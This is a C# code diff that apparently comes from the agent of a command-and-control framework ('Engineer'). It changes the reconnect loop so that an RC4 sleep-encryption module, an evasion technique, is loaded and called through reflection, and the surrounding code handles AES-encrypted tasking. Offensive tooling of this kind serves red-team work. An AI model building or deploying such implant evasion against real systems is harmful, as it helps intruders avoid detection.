@@ -14,6 +14,9 @@ using System.Security.Policy;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+using Engineer.Extra;
+using System.Reflection;
 
 namespace Engineer.Models
 {
@@ -74,7 +77,23 @@ namespace Engineer.Models
                         //Console.WriteLine("Attempting to reconnect");
                         if (Program.Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
                         {
-                            Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                            //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
+                            if (Program.typesWithModuleAttribute.Where(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)).Count() > 0)
+                            {
+                                //Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
+                                var sleepEncryptModule = Program.typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase));
+                                // Get the method
+                                var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
+                                if (method != null)
+                                {
+                                    // Call the method , first argument is null because it's a static method
+                                    method.Invoke(null, new object[] { EngCommBase.Sleep });
+                                }
+                            }
+                            else
+                            {
+                                Thread.Sleep(EngCommBase.Sleep);
+                            }
                         }
                         else if (Program.Sleeptype == SleepEnum.SleepTypes.None)
                         {
@@ -93,7 +112,7 @@ namespace Engineer.Models
                 }
                 var HttpResponseMessageReturned = await taskReturned;
                 var EncryptedresponseByte = HttpResponseMessageReturned.Content.ReadAsByteArrayAsync().Result;
-
+                
                 if (EncryptedresponseByte.Count() > 0) //if response is NOT null, empty, or white space then decrypt and handle it
                 {
                     var DecryptedTaskMessage = Encryption.AES_Decrypt(EncryptedresponseByte, Program.MessagePathKey);
